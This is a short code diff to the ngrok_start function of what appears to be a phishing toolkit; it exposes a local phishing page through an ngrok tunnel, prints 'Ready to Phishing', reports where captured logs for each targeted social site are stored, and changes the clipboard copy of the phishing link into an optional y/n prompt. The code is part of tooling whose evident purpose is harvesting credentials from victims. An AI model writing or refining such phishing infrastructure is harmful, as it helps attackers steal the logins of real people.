@@ -79,9 +79,12 @@ def ngrok_start(port: int):
             if ngrok_url.status_code == 200:
                 public_url = json.loads(ngrok_url.text)['public_url']
                 print(green(' [~] Ready to Phishing'))
-                print(green(" [~] The link is copied to clipboard"))
-                pyperclip.copy(public_url)
                 print(lightgreen(' [*] Ngrok URL: %s' % public_url))
+                print(lightgreen('Do you want to copy the phishing link?(y/n)'))
+                opt=input()
+                if opt=='y' or opt=='Y':
+                    pyperclip.copy(public_url)
+                    print(green(" [~] The link is copied to clipboard"))
                 print(green(' [~] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
                 print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
                 yield public_url
